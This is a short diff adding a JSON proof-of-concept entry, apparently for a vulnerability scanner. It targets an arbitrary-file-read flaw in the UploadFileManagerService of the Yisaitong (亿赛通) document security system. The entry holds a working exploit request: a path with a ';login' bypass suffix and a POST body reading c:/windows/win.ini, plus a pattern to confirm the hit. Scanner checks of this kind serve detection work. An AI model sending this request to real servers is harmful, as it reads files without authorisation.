@@ -1,0 +1,15 @@
+{
+	"name":"亿赛通电子文档安全管理系统-UploadFileManagerService-任意文件读取",
+	"tag":"yisaitong",
+	"type":"other",
+	"poc":{
+		"pocGet":"/CDGServer3/document/UploadFileManagerService;login",
+		"pocPost":"command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=111111",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(extension)"
+	}
+}
